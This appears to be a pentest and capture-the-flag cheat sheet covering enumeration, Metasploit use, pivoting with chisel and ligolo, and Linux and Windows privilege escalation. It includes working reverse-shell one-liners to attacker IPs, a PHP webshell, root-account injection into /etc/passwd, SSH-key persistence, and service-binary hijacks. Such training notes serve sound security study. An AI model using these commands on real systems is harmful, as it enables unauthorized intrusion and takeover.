
---

# Pentest Setup Info

```bash
$ sudo apt update -y && sudo apt full-upgrade -y && sudo apt autoremove -y && sudo apt autoclean -y  # Update and clean system
$ sudo apt install kali-linux-everything                                                             # Install everything 
$ sudo killall openvpn                                                                               # Disconnect all openvpn connections    
```


# CTF Stuff

```bash
$ sudo openvpn user.ovpn  # Connect to VPN
$ ifconfig/ip a	          # Show our IP address
$ ip a                    # Show our IP address
$ netstat -rn	          # Show networks accessible via the VPN
$ ssh user@10.10.10.10	  # SSH to a remote server
$ ftp 10.129.42.253	      # FTP to a remote server
```


---

## Project Structure

> Keep folder structure for External Pentests(EPT) and/or Internal Pentests (IPT)

```shell-session
$ tree Projects/

Projects/
└── Acme Company
    ├── EPT
    │   ├── evidence
    │   │   ├── credentials
    │   │   ├── data
    │   │   └── screenshots
    │   ├── logs
    │   ├── scans
    │   ├── scope
    │   └── tools
    └── IPT
        ├── evidence
        │   ├── credentials
        │   ├── data
        │   └── screenshots
        ├── logs
        ├── scans
        ├── scope
        └── tools
```

# Starting Steps

```bash
$ netstat -rn              # show us the networks accessible via the VPN          
$ nmap -sn 10.10.110.0/24  # ping sweep to show hosts online
$ sudo echo "10.129.227.241 permx.htb" | sudo tee -a /etc/hosts
$ nmap -A -sCV 10.129.227.241
```

OR

```bash
$ nmap -Pn -sC -sV --min-rate 2000 -oA nmap 10.129.48.17         # full port scan  
$ sudo nmap -v -sC -sV -p- 10.10.10.115                          # full port scan
$ sudo ffuf -u http://permx.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18 -t 100 -H "Host: FUZZ.permx.htb"

```

> The -v also allows us to see progress and open ports and -p- scans all ports..

---
# Enumeration

---

## Service Scanning

---

```bash
$ nmap -p- -T5 10.129.42.253 -v         # scan all ports
$ nmap -p 22,25,80 -A 10.129.42.253	-v  # enumerate only specific ports 
```

```bash
$ nmap -sV -sC -p- 10.129.42.253	                   # Run an nmap script scan on an IP scanning all ports
$ sudo nmap -sC -sV oA nmap/escapetwo 10.129.42.215 
$ locate scripts/citrix	                               # List various available nmap scripts
$ nmap --script smb-os-discovery.nse -p445 10.10.10.40 # Run an nmap script on an IP
$ netcat 10.10.10.10 22	                               # Grab banner of an open port
```

---
### FTP (20/21 TCP)

```bash
$ nmap -sC -sV -p21 10.129.42.253

$ ftp -p 10.129.42.253

Connected to 10.129.42.253.
220 (vsFTPd 3.0.3)
Name (10.129.42.253:user): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
```


### SSH (22 TCP)

```bash
$ netcat 10.10.10.10 22
SSH-2.0-OpenSSH_8.4p1 Debian-3
```


### Telnet (23 TCP)


### SMTP (25 TCP)


### DNS (53 TCP/UDP)
#### DNS Subdomain Enumeration
> Install SecLists

```bash
$ git clone https://github.com/danielmiessler/SecLists
$ sudo apt install seclists -y
```

> Add a DNS Server such as 1.1.1.1 to the `/etc/resolv.conf` file. We will target the domain `inlanefreight.com`, the website for a fictional freight and logistics company.

```bash
$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```


### Web (80/443 TCP)

```bash
$ gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
$ curl -IL https://www.inlanefreight.com    # Grab website banner
```

```bash
$ sudo ffuf -u http://permx.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18 -t 100 -H "Host: FUZZ.permx.htb"
```

```bash
$ whatweb --no-errors 10.10.10.0/24
$ whatweb 10.10.10.121                  # List details about the webserver/certificates
```

```bash
$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt	       # Run a directory scan on a website
$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt  # Run a sub-domain scan on a website
$ curl 10.10.10.121/robots.txt	                                                       # List potential directories in robots.txt
$ ctrl+U	                                                                           # View page source (in Firefox)
```


### SNMP (161/162 TCP/UDP)

```bash
$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0	# Scan SNMP on an IP
$ snmpwalk -v 2c -c private  10.129.42.253
$ onesixtyone -c dict.txt 10.129.42.254	                    # Brute force SNMP secret string
```


### LDAP (389 TCP/UDP)


### SMB (445 TCP)

```bash
$ nmap --script smb-os-discovery.nse -p445 10.129.42.253     
$ nmap -A -p445 10.129.42.253

$ smbclient -N -L \\\\10.129.42.253	          # List SMB Shares
$ smbclient \\\\10.129.42.253\\users	      # Connect to an SMB share
$ smbclient -U bob \\\\10.129.42.253\\users   
Enter WORKGROUP\bob's password: 
Try "help" to get a list of possible commands.
smb: \> ls

```

On seeing TCP 445 on Windows host:

- Enumerate Host
    - `netexec smb [ip]`
- List Shares
    - `netexec smb [host/ip] -u [user] -p [pass] --shares`
    - `netexec smb [host/ip] -u guest -p '' --shares`
    - `smbclient -N -L //[ip]`
- Enumerate Files
    - `smbclient //[ip]/[share] -N`
    - `smbclient //[ip]/[share] -U [username] [password]`
    - `netexec smb -u [user] -p [pass] -M spider_plus`
    - `smbclient.py '[domain]/[user]:[pass]@[ip/host] -k -no-pass` - Kerberos auth
    - `manspider.py --threads 256 [IP/CIDR] -u [username] -p [pass] [options]`
- User enumeration
    - RID Cycling
        - `lookupsid.py guest@[ip] -no-pass`
        - `netexec smb [ip] -u guest -p '' --rid-brute`
    - SAM Remote Protocol - `samrdump.py [domain]/[user]:[pass]@[ip]`
- Check for Vulnerabilities - `nmap --script smb-vuln* -p 139,445 [ip]`


### RDP (3389 TCP)



---
# Exploitation

---

## Public Exploits

```bash
$ sudo apt install exploitdb -y           # Install searchsploit
$ searchsploit openssh 7.2	              # Search for public exploits for a web application
$ sudo systemctl start postgresql         # Startup Postgresql DB 
$ msfconsole	                          # MSF: Start the Metasploit Framework
$ search exploit eternalblue	          # MSF: Search for public exploits in MSF
$ use exploit/windows/smb/ms17_010_psexec # MSF: Start using an MSF module
$ show options	                          # MSF: Show required options for an MSF module
$ set RHOSTS 10.10.10.40	              # MSF: Set a value for an MSF module option
$ check	                                  # MSF: Test if the target server is vulnerable
$ exploit	                              # MSF: Run the exploit on the target server is vulnerable
```


---

## Using Shells

```bash
$ nc -lvnp 1234	                                                                  # Start a nc listener on a local port
$ bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'                             # Send a reverse shell from the remote server
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f  # Another command to send a reverse shell from the remote server
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f	      # Start a bind shell on the remote server
$ nc 10.10.10.1 1234	                                                          # Connect to a bind shell started on the remote server
```


### Upgrade a shell to a fully interactive TTY

> Upgrade shell TTY using python

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'	

```

>Upgrade shell TTY : (Press ctrl+z then type "stty raw -echo" then "fg" then enter twice)

```bash
$ ^Z
$ stty raw -echo
$ fg
[Enter]
[Enter]
$
```

> Upgrade to TTY shell using socat

```bash
$ socat file:`tty`,raw,echo=0 tcp-listen:4444                            # Set listener on client
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  # Run on victim machine

```

> Using stty options

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'   # In reverse shell
Ctrl-Z

```

```bash
$ stty raw -echo       
$ fg

```

```bash
$ echo $TERM
$ stty size                                       # Run this to get the <num> and <cols>
$ stty raw -echo

$ reset                                           # In reverse shell
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>

```



### Webshell PHP

```bash
$ echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php  # Create a webshell php file
$ curl http://SERVER_IP:PORT/shell.php?cmd=id	                   # Execute a command on an uploaded webshell
Shell> bash -c "bash -i >& /dev/tcp/10.10.14.47/4008 0>&1"         # nc -lvnp 4008
$ python3 -c 'import os; os.system("/bin/bash");'
```


---

# Privilege Escalation

```bash
$ ./linpeas.sh	                        # Run linpeas script to enumerate remote server
$ sudo -l	                            # List available sudo privileges
$ sudo -u user /bin/echo Hello World!	# Run a command with sudo
$ sudo su -	                            # Switch to root user (if we have access to sudo su)
$ sudo su user -	                    # Switch to a user (if we have access to sudo su)
```

## SSH Key to User

```bash
$ ssh-keygen -f key                     # Create a new SSH key
```

>This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. Let us copy key.pub, then on the remote machine, we will add it into /root/.ssh/authorized_keys:

```bash
$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys  # Add the generated public key to the user
$ ssh root@10.10.10.10 -i key	                                              # SSH to the server with the generated private key
$ ssh user1@83.136.254.60 -p 42785                                            # SSH to a specific port  
```

### SSH Keys

> Finally, let us discuss SSH keys. If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server. If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it:

```bash 
$ vim id_rsa
$ chmod 600 id_rsa
$ ssh root@10.10.10.10 -i id_rsa
```

> If we find ourselves with write access to a users`/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:

```bash
$ ssh-keygen -f key
```

> This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:

```bash
$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
$ ssh root@10.10.10.10 -i key   # Log in as that user by using our private key
```



---
## Creating and writing account to /etc/passwd

```bash
$ openssl passwd -1 -salt bb pass123
$1$bb$W9A9S0PjWRE7zQKAB/ilZ.

$ echo "bb:$1$bb$W9A9S0PjWRE7zQKAB/ilZ.:0:0:root:/root:/bin/bash" >> /etc/passwd
# Had to nano /etc/passwd

```


---

## Transferring Files

```bash

$ python3 -m http.server 8000	                        # Start a local webserver
$ wget http://10.10.14.1:8000/linpeas.sh                # Download a file on the remote server
$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh  # Download a file on the remote server from our pc
$ scp linenum.sh user@remotehost:/tmp/linenum.sh	    # Transfer a file with scp (requires SSH access)
$ base64 shell -w 0	                                    # Convert a file to base64
$ echo f0VMR...SNIO...InmDwU | base64 -d > shell        # Convert a file from base64 back to its orig
$ file shell                                            # Validate file format   
$ md5sum shell	                                        # Check the file's md5sum 
```


---
## Pivoting

---

```Bash

$ ./chisel server -p 8001 --reverse
2024/12/28 03:56:31 server: Reverse tunnelling enabled
2024/12/28 03:56:31 server: Fingerprint 4gMpSAyyTLAqXTiF22e/QNnOyvSib42pCS8UYVSMzbQ=
2024/12/28 03:56:31 server: Listening on http://0.0.0.0:8001
2024/12/28 03:57:55 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

root@DANTE-WEB-NIX01:/home/balthazar/Documents# ./chisel client 10.10.14.3:8001 R:1080:socks 
2024/12/28 00:57:55 client: Connecting to ws://10.10.14.3:8001
2024/12/28 00:57:56 client: Connected (Latency 54.459235ms)

```

```bash
$ sudo nano /etc/proxychains4.conf
```

>At the bottom of the /etc/proxychains.conf add "socks5 127.0.0.1 1080" 

```bash
$ proxychains4 nmap 172.16.1.0/24 | more                    
```

### Sample Chisel Usage

> We can use chisel on any ports ssh would be a good one to establish access on a remote machine as well
> Attacker Box: 172.18.25.2
> Dual-Homed Box: 2.2.2.2/10.10.2.1
> Web Server: 10.10.2.5
> WinBox: 10.10.2.8 

```bash
$ chisel server --socks5 --reverse   # Start server on attacker machine                          
$ ip a s tun0

$ ./chisel client --fingerprint h3214jho89huk134hk12j4h= 172.18.25.2:8080 R:8000:10.10.2.5:80  # Creates a tunnel going in reverse where we can now access port 80 on the remote asset by opening up a web browser on port 8000
$ firefox http://localhost:8000  # We can now see port 80 on 10.10.2.5       

$ ./chisel client --fingerprint h3214jho89huk134hk12j4h= 172.18.25.2:8080 R:socks  # Creates a socks proxy that we can use with proxychains
$ sudo nano /etc/proxychains4.conf  # Add "socks5 127.0.0.1 1080" at the bottom of file, look for port chisel server is bound to from client connection
$ proxychains curl http://10.10.2.5  # Getting info via curl
$ proxychains xfreerdp /v:10.10.2.8 /u:Administrator  # Connect to rdp box


```

> Using Foxy proxy to add a way to see the web page for 10.10.2.5
> Name: Chisel Proxy 
> Proxy type: SOCKS5
> Proxy IP: 127.0.0.1
> Port 1080

```bash
$ ssh user@2.2.2.2  # connect to chisel client 
$ ./chisel client --fingerprint h3214jho89huk134hk12j4h= 172.18.25.2:8080 0.0.0.0:4444:172.18.25.2:4444  # Create a listening port to use with hoaxshell to get a reverse shell
$ python hoaxshell.py -s 10.10.2.1 -p 4444 # Copy powershell info into rdp connected windows box

```


### Ligolo-NG Usage

```bash
$ sudo ip tuntap add user labuser mode tun ligolo  # Add tunnel interface on proxy server
$ sudo ip link set ligolo up                       # enables interface

$ ./proxy -selfcert
INFO[0000] Listening on 0.0.0.0:11601

ligolo-ng >> INFO[0073] Agent joined.  


```

```bash
C:\Users\Bob\Desktop>ligolo-agent.exe -connect 192.168.85.128:11601 -ignore-cert


```
---

## Linux Privilege Escalation


---

- In order to understand what a particular Linux command does, use: [https://www.explainshell.com/](https://www.explainshell.com/)
- Important Resource: [https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)
- Privilege escalation is the technique used to escalate our privileges from lower user to higher user(interms of privileges)
- Once we obtain the higher level privilege on the system then we can do a lot of things on that system

---

### Enumeration:

- Here we're going to see few commands which help us in enumerating target system

1. `hostname` - lists the name of the host
2. `uname -a` - prints kernel information
3. `cat /proc/version` - prints almost same infor of above command but more like gcc version....
4. `cat /etc/issue` - exact version on the OS
5. `ps` - lists the processes that are running
    - `ps -A` - all running processes
    - `ps axjf` - process tree
    - `ps aux` - displays processes with the users as well
6. `env` - shows all the environment variable
7. `sudo -l` - lists the commands that any user run as root without password
8. `groups` - lists the groups that current user is in
9. `id` - lists id of group,user
10. `cat /etc/passwd` - displays all the user
    - `cat /etc/passwd | cut -d ":" -f 1` - removes other stuff & only displays users
    - `ls /home` - displays users
11. `history` - previously ran commands which might have some sensitive info
12. `ifconfig` (or) `ip a` (or) `ip route` - network related information
13. **netstat** - network route
    - `netstat -a` - all listening and established connection
    - `netstat -at` - tcp connections
    - `netstat -au` - udp connections
    - `netstat -l` - listening connections
    - `netstat -s` - network statistics
    - `netstat -tp` - connections with service name and pid we can also add "l" for only listening ports
    - `netstat -i` - interface related information
    - `netstat -ano`
14. **find** command which helps us in finding lot of stuff,
    - Syntax: `find <path> <options> <regex/name>` find . -name flag1.txt: find the file named “flag1.txt” in the current directory
    - `find /home -name flag1.txt` : find the file names “flag1.txt” in the /home directory
    - `find / -type d -name config` : find the directory named config under “/”
    - `find / -type f -perm 0777` : find files with the 777 permissions (files readable, writable, and executable by all users)
    - `find / -perm a=x` : find executable files
    - `find /home -user frank` : find all files for user “frank” under “/home”
    - `find / -mtime 10` : find files that were modified in the last 10 days
    - `find / -atime 10` : find files that were accessed in the last 10 day
    - `find / -cmin -60` : find files changed within the last hour (60 minutes)
    - `find / -amin -60` : find files accesses within the last hour (60 minutes)
    - `find / -size 50M` : find files with a 50 MB size
    - `find / -writable -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -222 -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -o w -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
    - We can also find programming languages and supported languages: `find / -name perl*`, `find / -name python*`, `find / -name gcc*` ...etc
    - `find / -perm -u=s -type f 2>/dev/null` : Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. This is important!
15. We can even make use of "grep", "locate", "sort"...etc

---

### Automated Enumeration Scripts:

- In real life we dont get much time to do enumeration so we can make use of some cool automated scripts like follows,
- LinPeas: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- LinEnum: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
- LES (Linux Exploit Suggester): [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- Linux Smart Enumeration: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- Linux Priv Checker: [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

---

### Linux Kernel Exploits:

- After finding the version of Kernel simple google for that exploit or you can also use "Linux Exploit suggester"
- Once you find the exploit for the privesc, transfer the payload from your machine to target machine and execute and you're good to go.
- In an example I worked out with **overlayfs** exploit and got higher privileges

---

### Sudo:

- This one of the first step to do, when you get access to the machine just simpley run "sudo -l", which lists all the files that we can run as root without any password
- Once you have any to run then navigate to [https://gtfobins.github.io/](https://gtfobins.github.io/) and search for is the one specified is a system program or else modify the file with "/bin/sh" and run that
- GTFO bins is going to be saviour!

---

### SUID:(Set owner User ID)

- Its a kind of permission which gives specific permissions to run a file as root/owner
- This is really helpful to test.
- `find / -perm -u=s -type f 2>/dev/null` this will list all the suid files
- Then later search in GTFObins and look for the way to bypass
- Resource: [https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)

---

### Capabilities:

- Capabilities are a bit similar to the SUID
- Capabilities provide a subset of root privileges to a process or a binary
- In order to look for them use `getcap -r / 2>/dev/null`
- Find the binary and check that on **GTFOBins** where there's a function for **Capabilities** and try out those any of them will work!
- In the example they provided a capability for `vim` and I used `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'` which is provided in the website itself and I got root!
- Remember that this process is hit or trail, if it doesnt work move on!

---

### Cron jobs:

- Crons jobs are used for scheduling! Here we can schedule any binary/process to run.
- Interesting part here is that by default they run with the owner privileges.
- But if we find any cron-job which we can edit then we can do a lot!
- Cron job config is stored as **crontabs**
- To view crontab, `cat /etc/crontab`
- Any one can view it!
- Now we'll can see some cron-jobs see whether you can edit or not, if you can then edit with some reverse shell and listen!
- Addtional Directories: 
	- /etc/crontab
	- /etc/cron.d
	- /var/spool/cron/crontabs/root

---

### PATH:

- PATH is an environment variable
- In order to run any binary we need to specify the full path also, but if the address of file is specified in PATH variable then we can simpley run the binary by mentioning its name, like how we run some command line tools like ls, cd,....etc
- In order to view the content in PATH variable we need to run `echo $PATH` and the outpur will be something like this `usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin`
- So whenever you use a tool without specifying path it searches in PATH and it runs!
- We can even add new path to PATH variable by `export PATH=<new-path>:$PATH`
- Also we need to find a writable paths so run `find / -writable 2>/dev/null`
- In the example I found a location where there's a script when I run its showing that "thm" not found, also it can be run as ROOT
- So I created a binary like `echo "/bin/bash" > thm` and gave executable rights then later added the path where **thm** located to PATH variable and now when I ran the binary then I got root!

---

### NFS:(Network File Sharing)

- In order to view the configuration of NFS run `cat /etc/exports` or also we can type `showmount -e <target IP>` on our machine to find the **mountable shares**.
- In the output look for directories having `no_root_squash`, this means that the particular share is _writable_, hence we can do something to acquires root!
- Now after getting some directories where we can play around lets navigate to our attacker machine and create a sample directory anywhere like `/tmp`...etc
- Now we need to mount to the target machine by, `mount -o rw <targetIP>:<share-location> <directory path we created>`, here `rw` means read, write privileges.
- Now go to the folder we created and create a binary which gives us root on running.
- Then go back to the target machine and we can view the binary we created in the place we mounted, now run that and get root privileges!(do note that giving executable rights is not sufficient, we also need to give share rights by `chmod +s <binary>`)
- Then we're good to go!


---

## Windows Privilege Escalation


---

- Preferable room is [https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc), but u can use anything of your choice.
- Some resources,
    - [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
    - [https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
    - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
    - [https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html)

---

### Types of accounts in windows machines:

- Administrator (local): This is the user with the most privileges.
- Standard (local): These users can access the computer but can only perform limited tasks. Typically these users can not make permanent or essential changes to the system.
- Guest: This account gives access to the system but is not defined as a user.
- Standard (domain): Active Directory allows organizations to manage user accounts. A standard domain account may have local administrator privileges.
- Administrator (domain): Could be considered as the most privileged user. It can edit, create, and delete other users throughout the organization's domain.
- **SYSTEM** : This not particularly an account but windows services utilize this account to do its task, but even this account has higher privileges

> `An Important point worth noting is Groups, any user of Group Administrator helps us to escalate!`

---

### Information Gathering:

- One of the best Resource: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

1. `whoami /priv` - current user's privileges
2. `net users` - lists all users
3. `net user <username>` - lists details of a specific user
4. `qwinsta` - Other users logged in simultaneously
5. `net localgroup` - Groups available in system
6. `net localgroup <group-name>` - list members of a specific group
7. `systeminfo` - gives all the info info about OS
8. `hostname` - hostname of system
9. `findstr /si password *.txt` - we're looking for the files which consist 'password' that too in text files
10. `wmic qfe get Caption,Description,HotFixID,InstalledOn` - this tells about the security patches and related information
11. `netstat -ano` - connections associated with the machine
12. `schtasks /query /fo LIST /v` - to look for any taks that are scheduled
13. `driverquery` - lists the driver related information
14. `sc query windefend` - looks for Antivirus service

---

### Windows Exploit Suggester:

- This is a legendary tool that most people use
- We can solve 60% boxes out there on internet using this tool
- Link: [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- Just have a copy of output of `systeminfo` tool in your machine and this is the only requirement for this tool
- Pro Tip: Make sure all dependancies are fulfilled!

---

### Vulnerable Software:

- Here we'll try to find the software version thats installed and look for whether its vulnerable or not
- `wmic product get name,version,vendor` - this gives product name, version, and the vendor. This particular command gives a proper visualisation of what we need.
- Sometimes the above command might not work so use `wmic service list brief | findstr "Running"` and in order to obtain more information regarding the service use `sc qc <ServiceName>`

---

### Privilege Escalation thru Metasploit:

- After getting session in metasploit, run a module named `post/multi/recon/local_exploit_suggester`, make sure that ur session is in background so that this tool works properly or u can simply load it from **meterpreter**.
- Then It'll suggest some modules which can be exploited so try them and some of them might work(optional).

---

### WinPEAS:

- This is an automated enumeration script which is quite helpful.
- For best usage look for all the options by running `winpeas.exe --help`
- Run the options that are only required and tune the output.

---

### Kernel Exploit:

- Use this particular tool called **Windows Exploit Suggester**
- Firstly get the info of system by running `systeminfo` command and copy that to any file and name it with extension `.txt`
- Now run the tool using the database
- Here look for the kernel releated exploits.
- Happy hacking!!

---

### Service Exploits:

#### Insecure service permissions:

- Here we'll try to identify services with some insecure permissions and then we can try to exploit them.
- Here we can make use of `winpeas.exe servicesinfo` command and we can see the services which are quite helpful
- One interesting part of output is like this,

```

    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: ChangeConfig

```

- But to obtain more information we can use a tool called **accesschk** which is by Microsoft, run it as follows `accesschk.exe /accepteula -uwcqv <current-user> <service>`, output is,

```
C:\PrivEsc>accesschk.exe /accepteula -uwcqv user daclsvc
daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

```

- But the main part is `service_change_config` where we can change configuration of the service.
- Run `sc qc <service>` and then note the Binary_path_name(this can be also called as `binpath`), which we're going to change(evil smile)
- No create a playload which is of shell type and transfer it to the target machine
- Syntax to change the config, `sc config <service> <option>="<value>"`
- Now `sc config daclsvc binpath="<path>"` and now start the service `sc start daclsvc`

---

#### Unquoted Service Path:(USP)

- For services the path needs to be in quotes, if its not enclosed like that then we can exploit that loophole and get high privilege.

```
Vulnerability Insight: 
The Windows API must assume where to find the referenced application if the path contains spaces and is not enclosed by quotation marks. If, for example, a service uses the unquoted path:

Vulnerable Service: C:\Program Files\Ignite Data\Vuln Service\file.exe

The system will read this path in the following sequence from 1 to 4 to trigger malicous.exe through a writeable directory.

C:\Program.exe
C:\Program Files\Ignite.exe
C:\Program Files\Ignite Data\Vuln.exe
C:\Program Files\Ignite Data\Vuln Service\file.exe
```

- To get more information just use **WinPEAS** script with option `servicesinfo`, here we can see info if we can exploit any **Unquoted Service Path**, Here I ran the tool and the interesting part of output is like this,

```
unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected  
```

- The output here clearly specifies that **No quotes and Space Detected** so we can conclude that we can exploit this particular service using **USP**
- And to gather more information regarding service use `sc qc <service>`
- Now let's check the permission for this particular location `C:\Program Files\Unquoted Path Service` using `accesschk`, so run `accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"`. Output:

```
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators

```

- We have read and write permission.
- Now we'll create a payload and paste it in `C:\Program Files\Unquoted Path Service`, thru `copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`, here I'm naming with a different name which has some advantage with alphabetical order as well.
- Now start the service, `sc start unquotedsvc`, we're admin!!!

---

#### Weak Registry Permissions:

- Here we'll try to exploit services with weak registry permissions.
- to look for we need to make use of `Winpeas` with `servicesinfo` option. The output looks similar to this

```
����������͹ Looking if you can modify any service registry
� Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions                                                                                          
    HKLM\system\currentcontrolset\services\regsvc (Interactive [FullControl])

```

- No we go the name of service which is `regsvc`, so lets dig deep about this service, so run `sc qc regsvc` and the output is,

```
sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

- Some cool fact is that the path is quotes so no **Unquoted Service Path**.
- Now lets run `accesschk.exe` and lets dig deep, so run `accesschk /acceptula -uvwqk <path of registry>`(which is `HKLM\system\currentcontrolset\services\regsvc`)
- look for `RW NT AUTHORITY\INTERACTIVE(KEY_ALL_ACCESS)` in output and we're now good to exploit.
- Noe lets see the options within the registry by using `reg query HKLM\system\currentcontrolset\services\regsvc` and I found an options called `ImagePath` which takes executable value, so lets exploit it. First of all create a reverse-shell.
- Now run `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`, choose path of payload according to ur requirement.
- Now run the service, `net start regsvc` and hurray! I got the shell.

---

#### Insecure Service Executables:

- Here the File permissions of a service is accessible by all! We try to change the executable of the service and we're good to go!
- Lets run **Winpeas** specifically with **servicesinfo** module and lets see anything interesting, and the output is,

```
filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]

```

- Everyone have access to the file for the service `filepermsvc`, so we'll create a payload a reverse_shell and replace that with the executable of the service and we'll obtain shell.
- This is kind of easy compared to above.

---

### Registry

- Here we make use of Registry to find out info and we'll try to exploit!
- We're juect checking the features which we can abuse

#### Autoruns:

- Autoruns is a feature in Windows to start few services or application during startup, for example "greenshot"
- We can check them manually by running `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` - this will display autorun programs and their paths.
- The output is,

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```

- We got 2 programs with path so lets test.
- Now we'll run **accesscheck** to check what permissions are available to the file-path of these autoruns
